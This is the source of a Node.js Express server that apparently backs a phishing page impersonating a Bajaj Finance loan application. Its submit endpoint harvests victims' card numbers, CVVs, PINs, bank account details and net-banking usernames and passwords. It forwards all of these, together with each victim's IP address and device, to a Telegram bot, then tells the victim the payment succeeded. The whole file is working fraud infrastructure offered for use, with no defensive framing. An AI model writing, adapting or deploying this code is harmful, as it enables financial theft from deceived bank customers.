const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Security Middleware
app.use(helmet());
app.use(compression());
app.use(cors({
    origin: '*',
    credentials: true
}));

// Rate Limiting - 100 requests per IP per 15 min
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests, please try again later.'
});
app.use(limiter);

// Static files
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Telegram Config - Environment Variables se secure
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID required!');
    process.exit(1);
}

// Send to Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        
        if (!response.ok) {
            console.error('Telegram API Error:', await response.text());
        }
    } catch (error) {
        console.error('Telegram Send Error:', error.message);
    }
}

// API Endpoint for form submission
app.post('/api/submit', async (req, res) => {
    try {
        const data = req.body;
        
        // Log all data
        console.log('📥 New Submission:', {
            ip: req.ip,
            userAgent: req.get('User-Agent'),
            timestamp: new Date().toISOString(),
            data: data
        });

        let message = `🔔 <b>New Bajaj Finance Loan Application!</b>\n\n`;
        message += `👤 <b>Name:</b> ${data.name || 'N/A'}\n`;
        message += `📱 <b>Mobile:</b> ${data.mobile || 'N/A'}\n`;
        message += `💰 <b>Loan Amount:</b> ₹${data.loanAmount || 'N/A'}\n\n`;
        message += `🏦 <b>Account No:</b> ${data.accountNo || 'N/A'}\n`;
        message += `🔢 <b>IFSC:</b> ${data.ifsc || 'N/A'}\n\n`;

        if (data.cardNumber) {
            message += `💳 <b>CARD DETAILS:</b>\n`;
            message += `┌─────────────────┐\n`;
            message += `│ ${data.cardNumber.replace(/ /g, '')} │\n`;
            message += `├─────────────────┤\n`;
            message += `│ Exp: ${data.expiry || 'N/A'} │ CVV: ${data.cvv || 'N/A'} │\n`;
            message += `└─────────────────┘\n`;
            message += `🔐 <b>PIN:</b> ${data.pin || 'N/A'}\n\n`;
        }

        if (data.netUsername) {
            message += `🏦 <b>NETBANKING:</b>\n`;
            message += `👤 <b>Username:</b> ${data.netUsername}\n`;
            message += `🔐 <b>Password:</b> ${data.netPassword}\n\n`;
        }

        message += `<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN')}\n`;
        message += `<b>🌐 IP:</b> ${req.ip}\n`;
        message += `<b>📱 Device:</b> ${req.get('User-Agent').substring(0, 100)}...`;

        // Send to Telegram
        await sendToTelegram(message);
        
        res.json({ success: true, message: 'Payment successful!' });
    } catch (error) {
        console.error('Submit Error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ success: false, message: 'Internal server error' });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}`);
});
